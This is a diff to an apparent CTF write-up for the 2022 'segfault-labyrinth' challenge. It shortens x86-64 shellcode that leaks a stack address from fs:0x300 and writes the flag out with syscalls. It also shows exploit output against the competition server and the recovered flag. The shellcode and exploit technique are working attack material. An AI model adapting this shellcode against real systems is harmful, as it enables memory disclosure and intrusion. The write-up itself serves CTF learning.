@@ -416,7 +416,7 @@ xor rdi, rdi
 mov rdx, 100
 mov eax, {constants.SYS_write}
 syscall
-mov eax, {constants.SYS_exit}
+add eax, {constants.SYS_exit - constants.SYS_write}
 syscall
 ''')
 
@@ -440,9 +440,9 @@ Get a stack leak from `fs:0 + 0x300`, then use the offset to the flag pointer (u
 > 
 > _`write` out FD `0`?!_  Yeah, you can do that.
 
-40 bytes:
+38 bytes:
 
-```
+```bash
 # ./exploit4.1.py D=1 REMOTE=1
 [+] Opening connection to segfault-labyrinth.2022.ctfcompetition.com on port 1337: Done
    0:   64 48 8b 34 25 00 03    mov    rsi, QWORD PTR fs:0x300
@@ -452,9 +452,9 @@ Get a stack leak from `fs:0 + 0x300`, then use the offset to the flag pointer (u
   13:   48 c7 c2 64 00 00 00    mov    rdx, 0x64
   1a:   b8 01 00 00 00          mov    eax, 0x1
   1f:   0f 05                   syscall
-  21:   b8 3c 00 00 00          mov    eax, 0x3c
-  26:   0f 05                   syscall
-[*] len(shellcode) = 40
+  21:   83 c0 3b                add    eax, 0x3b
+  24:   0f 05                   syscall
+[*] len(shellcode) = 38
 [*] Closed connection to segfault-labyrinth.2022.ctfcompetition.com port 1337
 CTF{c0ngratulat1ons_oN_m4k1nG_1t_thr0uGh_th3_l4Byr1nth}
 ```
